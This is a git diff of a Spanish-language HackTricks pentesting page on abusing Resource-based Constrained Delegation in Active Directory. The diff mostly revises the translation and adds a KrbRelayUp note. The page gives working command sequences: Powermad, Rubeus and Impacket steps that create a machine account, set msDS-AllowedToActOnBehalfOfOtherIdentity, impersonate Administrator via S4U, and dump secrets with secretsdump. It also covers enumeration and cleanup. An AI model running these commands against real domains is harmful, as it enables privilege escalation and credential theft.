@@ -1,46 +1,46 @@
-# Delegación Constrain Basada en Recursos
+# Resource-based Constrained Delegation
 
 {{#include ../../banners/hacktricks-training.md}}
 
 
-## Conceptos Básicos de la Delegación Constrain Basada en Recursos
+## Conceptos básicos de Resource-based Constrained Delegation
 
-Esto es similar a la [Delegación Constrain](constrained-delegation.md) básica pero **en lugar** de dar permisos a un **objeto** para **suplantar a cualquier usuario contra una máquina**. La Delegación Constrain Basada en Recursos **establece** en **el objeto quién puede suplantar a cualquier usuario contra él**.
+Esto es similar a la básica [Constrained Delegation](constrained-delegation.md) pero **en lugar de** dar permisos a un **objeto** para **impersonate any user against a machine**. Resource-based Constrain Delegation **sets** in **the object who is able to impersonate any user against it**.
 
-En este caso, el objeto restringido tendrá un atributo llamado _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ con el nombre del usuario que puede suplantar a cualquier otro usuario contra él.
+En este caso, el objeto restringido tendrá un atributo llamado _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ con el nombre del usuario que puede suplantar a cualquier otro usuario frente a él.
 
-Otra diferencia importante de esta Delegación Constrain con respecto a las otras delegaciones es que cualquier usuario con **permisos de escritura sobre una cuenta de máquina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) puede establecer el **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (En las otras formas de Delegación necesitabas privilegios de administrador de dominio).
+Otra diferencia importante entre esta Constrained Delegation y otras delegaciones es que cualquier usuario con **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) puede establecer el **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (en las otras formas de Delegation necesitas privilegios de domain admin).
 
-### Nuevos Conceptos
+### Nuevos conceptos
 
-En la Delegación Constrain se mencionó que la **`TrustedToAuthForDelegation`** bandera dentro del valor _userAccountControl_ del usuario es necesaria para realizar un **S4U2Self.** Pero eso no es completamente cierto.\
-La realidad es que incluso sin ese valor, puedes realizar un **S4U2Self** contra cualquier usuario si eres un **servicio** (tienes un SPN) pero, si **tienes `TrustedToAuthForDelegation`** el TGS devuelto será **Forwardable** y si **no tienes** esa bandera el TGS devuelto **no será** **Forwardable**.
+Antes, en Constrained Delegation se decía que el flag **`TrustedToAuthForDelegation`** dentro del valor _userAccountControl_ del usuario era necesario para realizar un **S4U2Self.** Pero eso no es completamente cierto.\
+La realidad es que incluso sin ese valor, puedes realizar un **S4U2Self** contra cualquier usuario si eres un **service** (tienes un SPN) pero, si **tienes `TrustedToAuthForDelegation`** el TGS devuelto será **Forwardable** y si **no tienes** ese flag el TGS devuelto **no** será **Forwardable**.
 
-Sin embargo, si el **TGS** utilizado en **S4U2Proxy** **NO es Forwardable**, intentar abusar de una **delegación Constrain básica** **no funcionará**. Pero si estás tratando de explotar una **delegación Constrain basada en recursos, funcionará**.
+Sin embargo, si el **TGS** usado en **S4U2Proxy** **NO es Forwardable**, intentar abusar de una **basic Constrain Delegation** no **funcionará**. Pero si intentas explotar una **Resource-Based constrain delegation**, funcionará.
 
-### Estructura del Ataque
+### Estructura del ataque
 
-> Si tienes **privilegios equivalentes de escritura** sobre una cuenta de **Computadora**, puedes obtener **acceso privilegiado** en esa máquina.
+> Si tienes **write equivalent privileges** sobre una cuenta de **Computer** puedes obtener **privileged access** en esa máquina.
 
-Supongamos que el atacante ya tiene **privilegios equivalentes de escritura sobre la computadora víctima**.
+Supongamos que el atacante ya tiene **write equivalent privileges over the victim computer**.
 
-1. El atacante **compromete** una cuenta que tiene un **SPN** o **crea uno** (“Servicio A”). Ten en cuenta que **cualquier** _Usuario Admin_ sin ningún otro privilegio especial puede **crear** hasta 10 objetos de Computadora (**_MachineAccountQuota_**) y establecerles un **SPN**. Así que el atacante puede simplemente crear un objeto de Computadora y establecer un SPN.
-2. El atacante **abusa de su privilegio de ESCRITURA** sobre la computadora víctima (ServicioB) para configurar **delegación constrain basada en recursos para permitir que ServiceA supla a cualquier usuario** contra esa computadora víctima (ServicioB).
-3. El atacante utiliza Rubeus para realizar un **ataque S4U completo** (S4U2Self y S4U2Proxy) desde el Servicio A al Servicio B para un usuario **con acceso privilegiado al Servicio B**.
-1. S4U2Self (desde la cuenta SPN comprometida/creada): Pide un **TGS de Administrador para mí** (No Forwardable).
-2. S4U2Proxy: Usa el **TGS no Forwardable** del paso anterior para pedir un **TGS** de **Administrador** al **host víctima**.
-3. Incluso si estás usando un TGS no Forwardable, como estás explotando la delegación constrain basada en recursos, funcionará.
-4. El atacante puede **pasar el ticket** y **suplantar** al usuario para obtener **acceso al ServicioB víctima**.
+1. El atacante **compromete** una cuenta que tiene un **SPN** o **crea una** (“Service A”). Ten en cuenta que **cualquier** _Admin User_ sin ningún otro privilegio especial puede **crear** hasta 10 Computer objects (**_MachineAccountQuota_**) y asignarles un **SPN**. Así que el atacante puede simplemente crear un Computer object y establecer un SPN.
+2. El atacante **abusa de su WRITE privilege** sobre el equipo víctima (ServiceB) para configurar **resource-based constrained delegation to allow ServiceA to impersonate any user** frente a ese equipo víctima (ServiceB).
+3. El atacante usa Rubeus para realizar un **full S4U attack** (S4U2Self y S4U2Proxy) desde Service A hacia Service B para un usuario **con privileged access to Service B**.
+1. S4U2Self (desde la cuenta SPN comprometida/creada): Solicita un **TGS of Administrator to me** (Not Forwardable).
+2. S4U2Proxy: Usa el **not Forwardable TGS** del paso anterior para solicitar un **TGS** de **Administrator** al **victim host**.
+3. Incluso si estás usando un TGS no Forwardable, como estás explotando Resource-based constrained delegation, funcionará.
+4. El atacante puede **pass-the-ticket** e **impersonate** al usuario para obtener **access to the victim ServiceB**.
 
-Para verificar el _**MachineAccountQuota**_ del dominio puedes usar:
+Para comprobar el _**MachineAccountQuota**_ del dominio puedes usar:
 ```bash
 Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
 ```
 ## Ataque
 
-### Creando un Objeto de Computadora
+### Creación de un objeto de equipo
 
-Puedes crear un objeto de computadora dentro del dominio usando **[powermad](https://github.com/Kevin-Robertson/Powermad):**
+Puedes crear un objeto de equipo dentro del dominio usando **[powermad](https://github.com/Kevin-Robertson/Powermad):**
 ```bash
 import-module powermad
 New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
@@ -48,9 +48,9 @@ New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '
 # Check if created
 Get-DomainComputer SERVICEA
 ```
-### Configuración de Delegación Constrainida Basada en Recursos
+### Configurar la delegación restringida basada en recursos
 
-**Usando el módulo de PowerShell de activedirectory**
+**Usando el módulo activedirectory de PowerShell**
 ```bash
 Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
@@ -70,27 +70,27 @@ msds-allowedtoactonbehalfofotheridentity
 ----------------------------------------
 {1, 0, 4, 128...}
 ```
-### Realizando un ataque S4U completo (Windows/Rubeus)
+### Realizando un S4U attack completo (Windows/Rubeus)
 
-Primero que nada, creamos el nuevo objeto de Computadora con la contraseña `123456`, así que necesitamos el hash de esa contraseña:
+Primero creamos el nuevo objeto Computer con la contraseña `123456`, por lo que necesitamos el hash de esa contraseña:
 ```bash
 .\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
 Esto imprimirá los hashes RC4 y AES para esa cuenta.\
-Ahora, se puede realizar el ataque:
+Ahora, el attack puede llevarse a cabo:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
-Puedes generar más tickets para más servicios solo pidiendo una vez usando el parámetro `/altservice` de Rubeus:
+Puedes generar más tickets para varios servicios solicitándolos una sola vez usando el parámetro `/altservice` de Rubeus:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
 > [!CAUTION]
-> Tenga en cuenta que los usuarios tienen un atributo llamado "**No se puede delegar**". Si un usuario tiene este atributo en True, no podrá impersonarlo. Esta propiedad se puede ver dentro de bloodhound.
+> Tenga en cuenta que los usuarios tienen un atributo llamado "**Cannot be delegated**". Si un usuario tiene este atributo en True, no podrás suplantarlo. Esta propiedad puede verse dentro de bloodhound.
 
-### Herramientas de Linux: RBCD de extremo a extremo con Impacket (2024+)
+### Herramientas en Linux: RBCD de extremo a extremo con Impacket (2024+)
 
-Si opera desde Linux, puede realizar toda la cadena RBCD utilizando las herramientas oficiales de Impacket:
+Si operas desde Linux, puedes realizar toda la cadena RBCD usando las herramientas oficiales de Impacket:
 ```bash
 # 1) Create attacker-controlled machine account (respects MachineAccountQuota)
 impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'
@@ -108,24 +108,24 @@ export KRB5CCNAME=$(pwd)/Administrator.ccache
 impacket-secretsdump -k -no-pass Administrator@victim.domain.local
 ```
 Notas
-- Si se aplica la firma LDAP/LDAPS, use `impacket-rbcd -use-ldaps ...`.
-- Prefiera claves AES; muchos dominios modernos restringen RC4. Impacket y Rubeus admiten flujos solo AES.
-- Impacket puede reescribir el `sname` ("AnySPN") para algunas herramientas, pero obtenga el SPN correcto siempre que sea posible (por ejemplo, CIFS/LDAP/HTTP/HOST/MSSQLSvc).
+- If LDAP signing/LDAPS is enforced, use `impacket-rbcd -use-ldaps ...`.
+- Prefiere claves AES; muchos dominios modernos restringen RC4. Impacket y Rubeus soportan flujos solo-AES.
+- Impacket puede reescribir el `sname` ("AnySPN") para algunas herramientas, pero obtén el SPN correcto siempre que sea posible (p. ej., CIFS/LDAP/HTTP/HOST/MSSQLSvc).
 
-### Accediendo
+### Acceso
 
-La última línea de comando realizará el **ataque S4U completo e inyectará el TGS** desde Administrator al host víctima en **memoria**.\
-En este ejemplo se solicitó un TGS para el servicio **CIFS** desde Administrator, por lo que podrá acceder a **C$**:
+La última línea de comando realizará el **ataque S4U completo y inyectará el TGS** desde Administrator al host víctima en **memoria**.\
+En este ejemplo se solicitó un TGS para el servicio **CIFS** del Administrator, por lo que podrás acceder a **C$**:
 ```bash
 ls \\victim.domain.local\C$
 ```
-### Abusar de diferentes tickets de servicio
+### Abusar de diferentes service tickets
 
-Aprenda sobre los [**tickets de servicio disponibles aquí**](silver-ticket.md#available-services).
+Infórmate sobre [**available service tickets here**](silver-ticket.md#available-services).
 
 ## Enumeración, auditoría y limpieza
 
-### Enumerar computadoras con RBCD configurado
+### Enumerar equipos con RBCD configurado
 
 PowerShell (decodificando el SD para resolver SIDs):
 ```powershell
@@ -143,14 +143,14 @@ try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $n
 }
 }
 ```
-Impacket (leer o vaciar con un comando):
+Impacket (leer o vaciar con un solo comando):
 ```bash
 # Read who can delegate to VICTIM
 impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
 ```
-### Limpieza / reinicio de RBCD
+### Limpieza / restablecer RBCD
 
-- PowerShell (limpiar el atributo):
+- PowerShell (borrar el atributo):
 ```powershell
 Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
 # Or using the friendly property
@@ -165,30 +165,32 @@ impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025
 ```
 ## Errores de Kerberos
 
-- **`KDC_ERR_ETYPE_NOTSUPP`**: Esto significa que kerberos está configurado para no usar DES o RC4 y solo estás proporcionando el hash RC4. Proporciona a Rubeus al menos el hash AES256 (o simplemente proporciónale los hashes rc4, aes128 y aes256). Ejemplo: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
-- **`KRB_AP_ERR_SKEW`**: Esto significa que la hora de la computadora actual es diferente de la del DC y kerberos no está funcionando correctamente.
-- **`preauth_failed`**: Esto significa que el nombre de usuario + hashes dados no están funcionando para iniciar sesión. Puede que hayas olvidado poner el "$" dentro del nombre de usuario al generar los hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
+- **`KDC_ERR_ETYPE_NOTSUPP`**: Esto significa que Kerberos está configurado para no usar DES ni RC4 y solo estás proporcionando el hash RC4. Proporciona a Rubeus al menos el hash AES256 (o simplemente pásale los hashes rc4, aes128 y aes256). Example: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
+- **`KRB_AP_ERR_SKEW`**: Esto significa que la hora del equipo actual difiere de la del DC y Kerberos no funciona correctamente.
+- **`preauth_failed`**: Esto significa que el usuario + hashes proporcionados no funcionan para iniciar sesión. Puede que hayas olvidado poner el "$" dentro del nombre de usuario al generar los hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
 - **`KDC_ERR_BADOPTION`**: Esto puede significar:
-- El usuario que intentas suplantar no puede acceder al servicio deseado (porque no puedes suplantarlo o porque no tiene suficientes privilegios)
+- El usuario al que intentas suplantar no puede acceder al servicio deseado (porque no puedes suplantarlo o porque no tiene suficientes privilegios)
 - El servicio solicitado no existe (si pides un ticket para winrm pero winrm no está en ejecución)
-- La computadora falsa creada ha perdido sus privilegios sobre el servidor vulnerable y necesitas devolvérselos.
-- Estás abusando del KCD clásico; recuerda que RBCD funciona con tickets S4U2Self no reenviables, mientras que KCD requiere que sean reenviables.
+- El fakecomputer creado ha perdido sus privilegios sobre el servidor vulnerable y necesitas devolvérselos.
+- Estás abusando de KCD clásico; recuerda que RBCD funciona con tickets S4U2Self non-forwardable, mientras que KCD requiere forwardable.
 
-## Notas, relés y alternativas
+## Notas, relays y alternativas
 
-- También puedes escribir el SD de RBCD sobre los Servicios Web de AD (ADWS) si LDAP está filtrado. Ver:
+- También puedes escribir el SD de RBCD sobre AD Web Services (ADWS) si LDAP está filtrado. See:
 
 
 {{#ref}}
 adws-enumeration.md
 {{#endref}}
 
-- Las cadenas de relé de Kerberos frecuentemente terminan en RBCD para lograr SYSTEM local en un solo paso. Ver ejemplos prácticos de extremo a extremo:
+- Las cadenas de relay de Kerberos frecuentemente terminan en RBCD para conseguir local SYSTEM en un paso. Ver ejemplos prácticos de extremo a extremo:
 
 
 {{#ref}}
 ../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
 {{#endref}}
+
+- Si LDAP signing/channel binding están **disabled** y puedes crear una cuenta de equipo, herramientas como **KrbRelayUp** pueden relayer una autenticación Kerberos coaccionada hacia LDAP, establecer `msDS-AllowedToActOnBehalfOfOtherIdentity` para tu cuenta de equipo en el objeto del equipo objetivo, e inmediatamente suplantar a **Administrator** vía S4U desde off-host.
 
 ## Referencias
 
@@ -198,7 +200,8 @@ adws-enumeration.md
 - [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
 - [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
 - Impacket rbcd.py (oficial): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
-- Hoja de trucos rápida de Linux con sintaxis reciente: https://tldrbins.github.io/rbcd/
+- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
+- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
 
 
 {{#include ../../banners/hacktricks-training.md}}
